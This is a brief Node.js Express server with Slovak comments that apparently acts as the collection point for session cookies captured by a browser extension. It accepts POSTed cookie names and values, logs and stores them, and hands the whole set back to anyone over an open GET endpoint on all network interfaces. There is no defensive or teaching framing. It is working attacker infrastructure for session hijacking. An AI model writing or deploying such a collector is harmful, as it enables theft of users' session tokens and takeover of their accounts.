const express = require("express");
const cors = require("cors");

const app = express();

// Povolenie CORS komunikácie a spracovania JSON údajov
app.use(cors());
app.use(express.json());

// Úložisko zachytených relácií
let sessions = {};

// Endpoint pre príjem údajov z webového rozšírenia
app.post("/sessid", (req, res) => {
  const { cookie, value, timestamp } = req.body;

  if (!cookie || !value) {
    return res.status(400).json({ error: "Neplatný payload" });
  }

  sessions[cookie] = {
    value,
    timestamp
  };

  console.log("Nove cookie:", cookie, value);
  res.sendStatus(200);
});

// Endpoint pre zobrazenie aktuálne uložených relácií
app.get("/sessid", (req, res) => {
  res.json(sessions);
});

// Spustenie servera na všetkých sieťových rozhraniach
app.listen(3000, "0.0.0.0", () => {
  console.log("Pocuvam na 0.0.0.0:3000");
});